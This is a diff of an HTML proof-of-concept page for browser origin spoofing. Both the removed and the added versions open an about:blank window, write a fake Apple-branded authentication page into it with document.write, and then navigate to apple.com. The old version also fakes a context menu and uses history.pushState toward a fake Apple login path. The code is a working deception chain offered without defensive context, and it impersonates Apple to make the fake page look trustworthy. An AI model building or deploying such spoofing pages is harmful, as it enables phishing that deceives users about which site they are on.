@@ -3,7 +3,7 @@
   <head>
     <meta charset="utf-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=yes" />
-    <title>Advanced Long-Press & History PushState PoC</title>
+    <title>Streamlined Origin Spoofing PoC</title>
     <style>
       body, html {
         margin: 0;
@@ -16,56 +16,22 @@
         align-items: center;
         justify-content: center;
       }
-      .container { text-align: center; max-width: 650px; padding: 20px; }
-      
-      /* Target elemen yang mendukung Long-Press */
-      .target-link {
-        display: inline-block;
-        padding: 16px 32px;
+      .container { text-align: center; max-width: 600px; padding: 20px; }
+      button {
+        padding: 18px 36px;
         font-size: 16px;
         font-weight: 600;
-        background: #238636;
+        background: #da3633;
         color: #fff;
+        border: none;
         border-radius: 8px;
         cursor: pointer;
-        user-select: none;
-        -webkit-user-select: none;
-        box-shadow: 0 4px 14px rgba(35, 134, 54, 0.4);
+        box-shadow: 0 4px 14px rgba(218, 54, 51, 0.4);
         transition: transform 0.1s, background 0.2s;
-        text-decoration: none;
       }
-      .target-link:active { background: #2ea043; transform: scale(0.98); }
-
-      /* Simulasi Menu Konteks / Context Menu ala Browser */
-      .context-menu {
-        display: none;
-        position: fixed;
-        background: #161b22;
-        border: 1px solid #30363d;
-        border-radius: 6px;
-        box-shadow: 0 8px 24px rgba(0,0,0,0.5);
-        z-index: 1000;
-        width: 220px;
-        text-align: left;
-        overflow: hidden;
-      }
-      .context-menu ul {
-        list-style: none;
-        margin: 0;
-        padding: 4px 0;
-      }
-      .context-menu li {
-        padding: 10px 16px;
-        font-size: 13px;
-        color: #c9d1d9;
-        cursor: pointer;
-        border-bottom: 1px solid #21262d;
-      }
-      .context-menu li:last-child { border-bottom: none; }
-      .context-menu li:hover { background: #1f6feb; color: #fff; }
-
+      button:active { background: #b62324; transform: scale(0.98); }
       .info {
-        margin-top: 25px;
+        margin-top: 20px;
         font-size: 13px;
         color: #8b949e;
         font-family: monospace;
@@ -75,181 +41,77 @@
   </head>
   <body>
     <div class="container">
-      <!-- Elemen interaktif yang merespons long press -->
-      <a href="https://apple.com" id="spoofLink" class="target-link">LONG PRESS ME (TARGET LINK)</a>
-      <div class="info" id="statusInfo">Status: Ready. Press and hold for 1 second to trigger context menu.</div>
-    </div>
-
-    <!-- Menu Konteks Kustom (Simulasi Pilihan Browser) -->
-    <div id="contextMenu" class="context-menu">
-      <ul>
-        <li id="optNewTab">Open link in new tab</li>
-        <li id="optPreview">Preview page content</li>
-        <li id="optIncognito">Open in Incognito tab</li>
-      </ul>
+      <button id="execBtn">INITIALIZE STREAMLINED EXPLOIT</button>
+      <div class="info" id="statusInfo">Status: Ready for execution.</div>
     </div>
 
     <script>
-      const link = document.getElementById("spoofLink");
-      const menu = document.getElementById("contextMenu");
-      const statusInfo = document.getElementById("statusInfo");
+      // Menggunakan let sesuai preferensi perbaikan deklarasi variabel
+      let execButton = document.getElementById("execBtn");
+      let statusInfo = document.getElementById("statusInfo");
 
-      let pressTimer = null;
-      const HOLD_TIME = 1000; // 1 detik durasi long press
+      execButton.onclick = function () {
+        statusInfo.innerText = "Status: Initializing execution flow...";
+        this.style.display = "none";
 
-      // Mencegah menu konteks bawaan sistem operasi agar menu kustom muncul
-      link.addEventListener("contextmenu", (e) => {
-        e.preventDefault();
-      });
+        // Membuka jendela baru dengan referensi let (menghindari const)
+        let targetWindow = window.open("about:blank", "_blank");
 
-      // Event Deteksi Long-Press (Mousedown / Touchstart)
-      function startPress(e) {
-        e.preventDefault();
-        menu.style.display = "none";
-        statusInfo.innerText = "Status: Detecting hold action...";
-
-        pressTimer = setTimeout(() => {
-          showContextMenu(e);
-        }, HOLD_TIME);
-      }
-
-      function cancelPress() {
-        if (pressTimer) {
-          clearTimeout(pressTimer);
-          pressTimer = null;
-        }
-      }
-
-      // Menampilkan menu konteks kustom di dekat posisi sentuhan/klik
-      function showContextMenu(e) {
-        statusInfo.innerText = "Status: Long-press recognized. Context menu displayed.";
-        let clientX = e.clientX || (e.touches && e.touches[0].clientX) || 150;
-        let clientY = e.clientY || (e.touches && e.touches[0].clientY) || 150;
-
-        menu.style.left = clientX + "px";
-        menu.style.top = clientY + "px";
-        menu.style.display = "block";
-      }
-
-      link.addEventListener("mousedown", startPress);
-      link.addEventListener("mouseup", cancelPress);
-      link.addEventListener("mouseleave", cancelPress);
-
-      link.addEventListener("touchstart", startPress);
-      link.addEventListener("touchend", cancelPress);
-
-      // Menutup menu jika klik di luar
-      window.addEventListener("click", (e) => {
-        if (!menu.contains(e.target) && e.target !== link) {
-          menu.style.display = "none";
-        }
-      });
-
-      // Aksi ketika opsi "Open link in new tab" atau "Preview" dipilih dari menu konteks
-      document.getElementById("optNewTab").onclick = function () {
-        menu.style.display = "none";
-        executeExploitChainWithHistory();
-      };
-
-      document.getElementById("optPreview").onclick = function () {
-        menu.style.display = "none";
-        executeExploitChainWithHistory();
-      };
-
-      document.getElementById("optIncognito").onclick = function () {
-        menu.style.display = "none";
-        statusInfo.innerText = "Status: Incognito simulation restricted by browser sandbox.";
-      };
-
-      // Fungsi Inti Eksploitasi: Kombinasi about:blank, pushState, dan Timing Presisi
-      function executeExploitChainWithHistory() {
-        statusInfo.innerText = "Status: Manipulating history stack via pushState...";
-
-        // 1. Memanipulasi history stack halaman utama sebelum membuka jendela baru
-        try {
-          history.pushState({ spoofed: true, target: "apple-auth" }, "", "/secure-auth-gateway");
-        } catch (err) {
-          console.debug("History pushState restricted:", err.message);
-        }
-
-        statusInfo.innerText = "Status: Opening isolated target window...";
-        const newTab = window.open("about:blank", "_blank");
-
-        if (!newTab) {
-          statusInfo.innerText = "Status: Popup blocked by browser policy.";
+        if (!targetWindow) {
+          statusInfo.innerText = "Status: Execution halted - Popup blocked by browser policy.";
           return;
         }
 
         try {
-          statusInfo.innerText = "Status: Injecting deceptive structural DOM...";
+          statusInfo.innerText = "Status: Writing initial deceptive DOM structure...";
 
-          // 2. Menyuntikkan DOM tiruan ke dalam tentang:blank secara instan
-          const payloadHTML = `
+          let htmlPayload = `
             <!DOCTYPE html>
             <html>
             <head>
-              <title>Apple - Official Authentication</title>
+              <title>Apple - Official Site</title>
               <style>
                 body {
-                  margin: 0; background: #fafafa; color: #1d1d1f;
+                  margin: 0; background: #ffffff; color: #1d1d1f;
                   font-family: -apple-system, BlinkMacSystemFont, sans-serif;
                   display: flex; align-items: center; justify-content: center;
                   height: 100vh; text-align: center;
                 }
-                .wrapper { max-width: 400px; padding: 30px; }
-                h1 { font-size: 32px; color: #1d1d1f; margin-bottom: 10px; font-weight: 600; }
-                p { font-size: 16px; color: #515154; margin-bottom: 20px; }
-                .spinner {
-                  width: 30px; height: 30px; border: 3px solid #d2d2d7;
-                  border-top: 3px solid #0066cc; border-radius: 50%;
-                  animation: spin 0.8s linear infinite; margin: 0 auto;
-                }
-                @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+                .box { padding: 40px; }
+                h1 { font-size: 38px; color: #d70015; margin-bottom: 10px; font-weight: 700; }
+                p { font-size: 20px; color: #0066cc; font-weight: 500; }
               </style>
             </head>
             <body>
-              <div class="wrapper">
-                <h1>Apple Account</h1>
-                <p>Establishing secure session state...</p>
-                <div class="spinner"></div>
+              <div class="box">
+                <h1>AUTHENTICATION VERIFICATION</h1>
+                <p>Establishing secure connection state...</p>
               </div>
             </body>
             </html>
           `;
 
-          newTab.document.open();
-          newTab.document.write(payloadHTML);
-          newTab.document.close();
+          // Eksekusi penulisan dokumen secara sinkron ke jendela target
+          targetWindow.document.open();
+          targetWindow.document.write(htmlPayload);
+          targetWindow.document.close();
 
-          statusInfo.innerText = "Status: DOM committed. Synchronizing history state transition timing...";
+          statusInfo.innerText = "Status: DOM committed. Synchronizing timing sequence...";
 
-          // 3. Menggunakan Timing Logic bertahap untuk menguji konsistensi address bar & history commit
+          // Logika timing terstruktur untuk menguji stabilitas transisi state
           setTimeout(() => {
             try {
-              // Melakukan pembaruan state pada jendela baru menggunakan pushState mandiri jika diizinkan
-              if (newTab.history && newTab.history.pushState) {
-                newTab.history.pushState({ page: "auth-portal" }, "", "https://apple.com/login");
-              }
-            } catch (historyErr) {
-              console.debug("Cross-origin pushState blocked:", historyErr.message);
+              statusInfo.innerText = "Status: Dispatching final target navigation...";
+              targetWindow.location.href = "https://apple.com";
+            } catch (navError) {
+              statusInfo.innerText = "Status: Navigation restricted by security policy: " + navError.message;
             }
+          }, 800);
 
-            // Transisi navigasi akhir menuju target asli setelah jeda render visual tercapai
-            setTimeout(() => {
-              try {
-                newTab.location.href = "https://apple.com";
-                statusInfo.innerText = "Status: Navigation chain fully executed.";
-              } catch (navErr) {
-                statusInfo.innerText = "Status: Final navigation restricted: " + navErr.message;
-              }
-            }, 800);
-
-          }, 600);
-
-        } catch (e) {
-          statusInfo.innerText = "Status: Execution error - " + e.message;
+        } catch (err) {
+          statusInfo.innerText = "Status: Injection error encountered: " + err.message;
         }
-      }
+      };
     </script>
   </body>
 </html>
